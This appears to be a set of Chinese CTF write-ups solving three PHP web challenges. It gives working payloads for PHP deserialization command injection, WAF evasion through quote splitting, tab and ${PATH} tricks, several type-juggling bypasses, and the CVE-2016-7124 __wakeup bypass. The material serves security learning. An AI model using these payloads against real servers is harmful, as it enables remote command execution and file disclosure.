# unseping

原本说做下简单题来清醒一下头脑的，但上来就整个 php 反序列化，人麻了。正好之前没学明白反序列化，现在补一补。

##### php反序列化的定义：

```
所有php里面的值都可以使用函数serialize()来返回一个包含字节流的字符串来表示。unserialize()函数能够重新把字符串变回php原来的值。 序列化一个对象将会保存对象的所有变量，但是不会保存对象的方法，只会保存类的名字。

这本来是很正常的事情，因为php向用户传输数据时序列化后的二进制流能更方便传输。但是php中存在着魔法函数（或者说魔术函数（magic function）），魔术函数又具有调用其它函数、连接数据库、自己调用自己的功能，并且序列化或者反序列化的时候都会去检查有无相关魔术函数。这些特性都让攻击者有了一个可以通过调用相关函数获取目标服务器信息的可能。
```

##### 常见魔法函数如下（前边都是带__的）：![php魔法方法](D:\RE\learn\before\WEB\unseping\php魔法方法.jpg)

好，现在我们对序列化有了一定的了解，来看下这一题。

##### 代码如下：

```
<?php
highlight_file(__FILE__);

class ease{
    
    private $method;
    private $args;
    function __construct($method, $args) {
        $this->method = $method;
        $this->args = $args;
    }
 
    function __destruct(){
        if (in_array($this->method, array("ping"))) {//检查方法是不是在数组ping里边
            call_user_func_array(array($this, $this->method), $this->args);//传参
        }
    } 
 
    function ping($ip){
        exec($ip, $result);
        var_dump($result);
    }//说明服务器会执行这个叫ping的函数（不是ping命令啊）

    function waf($str){
        if (!preg_match_all("/(\||&|;| |\/|cat|flag|tac|php|ls)/", $str, $pat_array)) {
            return $str;
        } else {
            echo "don't hack";
        }
    }//waf 做了过滤
 
    function __wakeup(){
        foreach($this->args as $k => $v) {
            $this->args[$k] = $this->waf($v);
        }
    }//__wakeup   
}//class定义结束

$ctf=@$_POST['ctf'];//post表单里边有ctf这个东西，如果没有我们要自己加(用hacker bar或者手动抓包加都行)
@unserialize(base64_decode($ctf));
//反序列化，生成的序列化系列记得要用base64加密，因为这是服务端的php
?>
```

这里的代码就是说服务器收到post包，然后检查里边有没有ctf这个表项，有的话根据上述情况做‘ping’的执行以及waf的过滤，魔法函数由序列化函数触发。

好，那么思路就明确了，我们需要用post包发送有关ctf的参数，这个参数要包含在ping这个数组里边。同时，这个ctf里边的参数是序列化后并且经过base64加密后的数据。数据到达服务端后需要绕过上述waf的过滤。

于是，我们可以构造payload如下：

```
$a=new ease('ping',array(urldecode('whoami'))); //用url编码来进行web上边的传输

echo urlencode(base64_encode(serialize($a)));//需要由回显的
```

这样就完成了注入的查询。

##### hackbar写表单：

![hackerbar构造](D:\RE\learn\before\WEB\unseping\hackerbar构造.jpg)

因为是post传表单，里边的body里是序列化后的payload。如果用get的话是在url写payload信息。

然后我们可以用绕过来找flag的位置，关键字可以用单引号绕过，比如 flag 可以写成：

```
fl\'\'ag
```

特殊符号/\等的绕过方法可以参考下方：

https://blog.csdn.net/qq_34246965/article/details/108085291

```
${}
假设我们定义了一个变量为：
file=/dir1/dir2/dir3/my.file.txt
我们可以用 ${ } 分别替换获得不同的值：
${file#*/}：拿掉第一条 / 及其左边的字串：dir1/dir2/dir3/my.file.txt
${file##*/}：拿掉最后一条 / 及其左边的字串：my.file.txt
${file#*.}：拿掉第一个 . 及其左边的字串：file.txt
${file##*.}：拿掉最后一个 . 及其左边的字串：txt
${file%/*}：拿掉最后条 / 及其右边的字串：/dir1/dir2/dir3
${file%%/*}：拿掉第一条 / 及其右边的字串：(空值)
${file%.*}：拿掉最后一个 . 及其右边的字串：/dir1/dir2/dir3/my.file
${file%%.*}：拿掉第一个 . 及其右边的字串：/dir1/dir2/dir3/my



`${}`
一定是用反单引号啊！不要写成单引号了！！
可以代替 ‘’ 和 “”
在 `` 中可以使用 ${} 直接把变量和字符串拼接起来
```

于是可构造如下payload：

```
ca\'\'t%09fl\'\'ag_1s_here${PATH%%u*}fl\'\'ag_831b69012c67b35f.p\'\'hp
```

然后看回显拿flag即可



# easyphp

一道考察php绕过的题目

上来代码给得很清楚了，如下：

```
<?php
highlight_file(__FILE__);
$key1 = 0;
$key2 = 0;

$a = $_GET['a'];
$b = $_GET['b'];

if(isset($a) && intval($a) > 6000000 && strlen($a) <= 3){//第一个绕过点：绕过intval
    if(isset($b) && '8b184b' === substr(md5($b),-6,6)){//第二个点，用碰撞得出b的值
        $key1 = 1;
        }else{
            die("Emmm...再想想");
        }
    }else{
    die("Emmm...");
}

$c=(array)json_decode(@$_GET['c']);
if(is_array($c) && !is_numeric(@$c["m"]) && $c["m"] > 2022){//这里要绕过in_numeric函数
    if(is_array(@$c["n"]) && count($c["n"]) == 2 && is_array($c["n"][0])){
    //第四点，绕过is_array函数
        $d = array_search("DGGJ", $c["n"]);//第五点，绕过array_search
        $d === false?die("no..."):NULL;
        foreach($c["n"] as $key=>$val){
            $val==="DGGJ"?die("no......"):NULL;
        }
        $key2 = 1;
    }else{
        die("no hack");
    }
}else{
    die("no");
}

if($key1 && $key2){
    include "Hgfks.php";
    echo "You're right"."\n";
    echo $flag;
}

?> Emmm...再想想
```

总共五个绕过，五个函数的特性如下：

**intval()**  函数获取变量的整数值，因为这里由strlen限制，所以可以用 科学计数法：1e9  绕过。平时的绕过操作可参考如下：

https://blog.csdn.net/qq_61778128/article/details/122588316

**substr()**  函数是把函数中的字符串赋到另一个变量或者其它的什么里边去，例如：

```
<?php
echo substr("Hello world",-11,11)//这里表示起始位置，和python的元组左右平移差不多意思
?>
```

因为题目的 substr(md5($b),-6,6)) 后边的-6,6就是唬人的东西，所以穷举md5的脚本如下：

```
for($i = 1;$i <= 100000;$i++){
    if('8b184b' === substr(md5($i),-6,6)){
        echo $i;
    }
}
```

**is_numeric()** 函数用于检测变量是否为数字或数字字符串，返回值是boolean。可通过%00来绕过，示例payload如下：

```
c={"m":"9999%00"}
```

**is_array()** 函数用于检测变量是否是一个数组，返回值也是boolean。这里检查的变量是 c 里边的 n

```
c={"m":"9999%00","n":[[1]]}
```

**array_search()** 函数在数组中搜索某个键值，并返回对应的键名。

这里有等号的说法：

‘=’，‘==’，‘===’
一个等于是赋值，两个等于是将两个变量转相同的类型再比较，三个等于先比较变量类型是否相同再比较值。

该函数的绕过思路是直接把要检测的字符串变成不符合类型的情况，比如“admin”字符接受到了double类型或者int类型，这样子就不会触发函数的搜索形式。

payload如下：

```
c={"m":"9999%00","n":[[0,2],0]}//变成了int类型的数组
```

最后将所有payload进行组合，get类型表单内多个参数的构造用&连接。

```
?a=1e9&&b=53724&&c={"m":"9999%00","n":[[0,2],0]}
```

最后url编码有花括号的部分，再用hackbar执行

```
?a=1e9&b=53724&c=%7B%22m%22%3A%229999%2500%22%2C%22n%22%3A%5B%5B0%2C2%5D%2C0%5D%7D
```



# Web_php_unserialize

进入之后代码如下：

```
<?php 
class Demo { 
    private $file = 'index.php';
    public function __construct($file) { 
        $this->file = $file; 
    }
    function __destruct() { 
        echo @highlight_file($this->file, true); 
    }
    function __wakeup() { 
        if ($this->file != 'index.php') { 
            //the secret is in the fl4g.php
            $this->file = 'index.php'; 
        } 
    } 
}
if (isset($_GET['var'])) { 
    $var = base64_decode($_GET['var']); 
    if (preg_match('/[oc]:\d+:/i', $var)) { 
        die('stop hacking!'); 
    } else {
        @unserialize($var); 
    } 
} else { 
    highlight_file("index.php"); 
} 
?>
```

很明显是一个get发包，那么构造payload需要在url里边加。另外还做了base64的加密以及waf的过滤，可以。

而且给了提示，说flag在index.php里边。_wakeup这边有判定，如果不是index.php就转换为index.php。所以我们还得做对__wakeup的绕过。

这里构造payload时注意php的语法。本题的class叫Demo，所以创建新变量的时候如下：

```
$var=new Demo('whoami/');
echo (base64_encode(serialize($var)));
```

把生成的序列粘贴到hackbar里边，就能触发stop hacking页面了。

现在我们要绕过__wakeup，用CVE-2016-7124。这个漏洞在反序列化的时候，如果表示对象属性个数的值大于真实的属性个数时，就会跳过wakeup的执行。

例如：

原序列化：

```
$var = serialize($var);
var_dump($var);//string(48) "O:4:"Demo":1:{s:10:"Demofile";s:8:"fl4g.php";}"
```

加了绕过语句后的序列化：

```
$var = str_replace(':1:', ':2:',$var);//绕过wakeup
var_dump($var);//string(49) "O:4:"Demo":2:{s:10:"Demofile";s:8:"fl4g.php";}"
```

preg_match()可用正则绕过，把O：4变成O：+4。语句如下：

```
$var = str_replace('O:4', 'O:+4',$var);//绕过preg_match
```

在替换前记得加入序列化的代码，使原字符先序列化。然后再执行代码拿到序列化后的字符串，放到get包里边即可。







